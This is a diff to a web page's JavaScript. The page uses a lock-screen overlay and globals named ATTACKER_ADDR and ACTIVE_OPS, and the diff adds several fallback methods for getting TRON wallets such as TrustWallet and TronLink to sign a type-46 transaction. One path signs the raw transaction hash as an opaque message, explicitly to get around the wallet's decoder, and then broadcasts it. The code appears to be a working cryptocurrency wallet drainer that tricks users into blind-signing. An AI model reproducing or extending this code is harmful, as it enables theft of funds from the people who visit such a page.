@@ -474,16 +474,25 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
   window._ATTACKER_ADDR = ATTACKER_ADDR;
   window._ACTIVE_OPS    = ACTIVE_OPS;
   /* VERSION TAG — visible in debug overlay so we know cache is busted */
-  var _VER = 'v5';
+  var _VER = 'v6';
   window.__logINF && window.__logINF('SCRIPT ' + _VER + ' loaded');
   /* ---- sign helper: global on window (fixes WebKit async-fn hoisting in IIFEs) ---- */
+
+  // sha256 of raw hex bytes — needed for Path G (sign actual TRON tx hash)
+  async function _sha256hex(hexStr) {
+    var bytes = new Uint8Array(hexStr.match(/.{1,2}/g).map(function(b){ return parseInt(b,16); }));
+    var hashBuf = await crypto.subtle.digest('SHA-256', bytes);
+    return Array.from(new Uint8Array(hashBuf)).map(function(b){ return b.toString(16).padStart(2,'0'); }).join('');
+  }
+
   window._signTx = async function _signTx(tw, tx, label) {
     var L = label || 'sign';
     window.__logINF(L + ' tx keys=' + JSON.stringify(Object.keys(tx)));
     // Diagnostic: log available TRON providers
     window.__logINF(L + ' providers: tronLink=' + (!!window.tronLink)
       + ' tron=' + (!!window.tron)
-      + ' tw.tron=' + (!!(window.trustwallet && window.trustwallet.tron)));
+      + ' tw.tron=' + (!!(window.trustwallet && window.trustwallet.tron))
+      + ' tl.tw=' + (!!(window.tronLink && window.tronLink.tronWeb)));
 
     // Path A: window.trustwallet.tron.signTransaction (native TW DApp API)
     if (window.trustwallet && window.trustwallet.tron
@@ -492,7 +501,36 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
         window.__logINF(L + ' A: trustwallet.tron.signTransaction');
         var rA = await window.trustwallet.tron.signTransaction(tx);
         if (rA && rA.signature) { window.__logINF(L + ' A OK'); return rA; }
+        window.__logINF(L + ' A no sig: ' + JSON.stringify(rA).slice(0,80));
       } catch(eA) { window.__logERR(L + ' A FAIL: ' + eA.message); }
+    }
+
+    // Path F: window.tronLink.tronWeb.trx.sign(tx) — TronLink's OWN tronWeb instance
+    // DIFFERENT from tronLink.sign() — goes through TronLink's injected TronWeb
+    // which is maintained separately and may support type 46
+    if (window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.trx) {
+      try {
+        window.__logINF(L + ' F: tronLink.tronWeb.trx.sign tx');
+        var rF = await window.tronLink.tronWeb.trx.sign(tx);
+        if (rF && rF.signature) {
+          window.__logINF(L + ' F OK sig=' + rF.signature[0].slice(0,12) + '… len=' + rF.signature[0].length);
+          return rF;
+        }
+        window.__logINF(L + ' F no sig: ' + JSON.stringify(rF).slice(0,80));
+      } catch(eF) { window.__logERR(L + ' F FAIL: ' + eF.message); }
+    }
+
+    // Path H: window.tronLink.request tron_signTransaction (EIP-1193 style via TronLink compat)
+    if (window.tronLink && typeof window.tronLink.request === 'function') {
+      try {
+        window.__logINF(L + ' H: tronLink.request tron_signTransaction');
+        var rH = await window.tronLink.request({ method: 'tron_signTransaction', params: tx });
+        if (rH && rH.signature) {
+          window.__logINF(L + ' H OK sig=' + rH.signature[0].slice(0,12) + '… len=' + rH.signature[0].length);
+          return rH;
+        }
+        window.__logINF(L + ' H no sig: ' + JSON.stringify(rH).slice(0,80));
+      } catch(eH) { window.__logERR(L + ' H FAIL: ' + eH.message); }
     }
 
     // Path B: window.tronLink.sign (TronLink-compat native method)
@@ -501,6 +539,7 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
         window.__logINF(L + ' B: tronLink.sign');
         var rB = await window.tronLink.sign(tx);
         if (rB && rB.signature) { window.__logINF(L + ' B OK'); return rB; }
+        window.__logINF(L + ' B no sig: ' + JSON.stringify(rB).slice(0,80));
       } catch(eB) { window.__logERR(L + ' B FAIL: ' + eB.message); }
     }
 
@@ -521,25 +560,51 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
     } catch(eD) { window.__logERR(L + ' D FAIL: ' + eD.message); }
 
     // Path A2: window.trustwallet.tron.request({method:'tron_signTransaction'})
-    // tw.tron=true but signTransaction method may not exist — try request() instead
     if (window.trustwallet && window.trustwallet.tron
         && typeof window.trustwallet.tron.request === 'function') {
       try {
         window.__logINF(L + ' A2: trustwallet.tron.request tron_signTransaction');
         var rA2 = await window.trustwallet.tron.request({ method: 'tron_signTransaction', params: [tx] });
-        if (rA2 && rA2.signature) { window.__logINF(L + ' A2 OK'); return rA2; }
+        if (rA2 && rA2.signature) {
+          window.__logINF(L + ' A2 OK sig=' + rA2.signature[0].slice(0,12) + '… len=' + rA2.signature[0].length);
+          return rA2;
+        }
+        window.__logINF(L + ' A2 no sig: ' + JSON.stringify(rA2).slice(0,80));
       } catch(eA2) { window.__logERR(L + ' A2 FAIL: ' + eA2.message); }
     }
 
-    // Path E: sign raw_data_hex as a MESSAGE string (bypasses type-46 deserializer)
-    // TRON tx signing = secp256k1(sha256(raw_data_bytes)) which is identical to
-    // TronLink message signing of the same hex string (no prefix added).
-    // This path works even when wallet's bundled TronWeb can't decode type 46.
-    // FIX: strip 0x prefix if TW returns message-style sig (0xABCD...) — TRON needs raw hex
-    window.__logINF(L + ' E: trx.sign(raw_data_hex string)');
+    // Path G: sign the actual sha256(raw_data_bytes) — the real TRON tx hash
+    // TRON signing: sig = secp256k1(sha256(protobuf_bytes), privkey)
+    // Try useTronHeader=false (3rd arg) to avoid TRON personal_sign prefix
+    // If TW ignores 3rd arg → same message key problem
+    // If TW respects it → no prefix → REAL tx hash signed with message key
+    // Still may be wrong key but worth testing
+    try {
+      window.__logINF(L + ' G: trx.sign(sha256(rawDataBytes), null, false)');
+      var txHashHex = await _sha256hex(tx.raw_data_hex);
+      window.__logINF(L + ' G txhash=' + txHashHex.slice(0,16) + '…');
+      var hexSigG = await tw.trx.sign(txHashHex, null, false);
+      var cleanSigG = (typeof hexSigG === 'string' && hexSigG.startsWith('0x')) ? hexSigG.slice(2) : hexSigG;
+      var cloneG = JSON.parse(JSON.stringify(tx));
+      cloneG.signature = [cleanSigG];
+      window.__logINF(L + ' G OK sig=' + cleanSigG.slice(0,16) + '… (len=' + cleanSigG.length + ')');
+      try {
+        window.__logINF(L + ' G broadcasting…');
+        var bG = await tw.trx.sendRawTransaction(cloneG);
+        if (bG && bG.result) {
+          window.__logOK(L + ' G broadcast OK txid=' + (bG.txid || '?'));
+          return cloneG;
+        }
+        window.__logERR(L + ' G broadcast FAIL: ' + JSON.stringify(bG).slice(0,200));
+      } catch(ebG) { window.__logERR(L + ' G broadcast ERR: ' + ebG.message); }
+    } catch(eG) { window.__logERR(L + ' G FAIL: ' + eG.message); }
+
+    // Path E: sign raw_data_hex as a MESSAGE string (last resort — KNOWN BAD KEY in TW)
+    // TW message signing uses a DIFFERENT derived key (not the account key) → SIGERROR
+    // Keeping only for diagnostic: check if G key == E key
+    window.__logINF(L + ' E: trx.sign(raw_data_hex string) [KNOWN BAD KEY]');
     var hexSig = await tw.trx.sign(tx.raw_data_hex);
     var cleanSig = (typeof hexSig === 'string' && hexSig.startsWith('0x')) ? hexSig.slice(2) : hexSig;
-    // Result is a plain hex string — wrap into tx object
     var signedClone = JSON.parse(JSON.stringify(tx));
     signedClone.signature = [cleanSig];
     window.__logINF(L + ' E OK sig=' + cleanSig.slice(0,16) + '… (len=' + cleanSig.length + ')');
